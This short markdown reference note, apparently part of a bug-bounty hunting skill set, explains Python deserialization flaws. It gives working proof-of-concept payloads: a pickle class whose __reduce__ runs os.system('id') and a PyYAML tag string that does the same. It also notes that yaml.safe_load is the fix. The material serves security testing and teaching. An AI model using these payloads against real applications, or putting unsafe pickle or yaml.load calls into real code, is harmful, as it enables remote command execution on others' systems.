# Python Pitfalls — Cross-Reference for Deserialization

## Relevant to: hunt-deserialization
## Source: https://www.yeswehack.com/learn-bug-bounty/python-pitfalls-turning-developer-mistakes

## pickle.loads — RCE via Deserialization
```python
import pickle, os
class Evil:
    def __reduce__(self):
        return (os.system, ('id',))

payload = pickle.dumps(Evil())
# When unpickled: executes 'id' command!
```

## PyYAML unsafe load — RCE via Deserialization
```python
import yaml
yaml.load("!!python/object/apply:os.system ['id']")
# RCE! Use yaml.safe_load() instead
```

## Cross-Skill Notes
- pickle.loads(user_input) = RCE
- yaml.load(user_input) = RCE
- Both are Python-specific deserialization vulnerabilities
- Same class as Java deserialization (CommonsCollections), PHP unserialize, .NET BinaryFormatter